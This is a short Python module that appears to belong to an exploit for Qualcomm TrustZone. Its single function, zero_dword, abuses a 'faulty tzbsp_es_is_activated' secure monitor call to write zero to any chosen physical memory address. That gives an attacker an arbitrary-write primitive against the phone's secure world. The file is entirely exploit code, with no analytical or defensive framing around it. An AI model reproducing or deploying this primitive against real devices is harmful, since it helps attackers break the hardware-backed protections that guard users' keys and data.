from scm import *
from consts import *

def zero_dword(address):
        '''
        Zeroes out the DWORD at the given physical address using the faulty tzbsp_es_is_activated SCM
        '''
        execute_register_scm(SCM_SVC_ES, SCM_IS_ACTIVATED_ID, (address, 0))

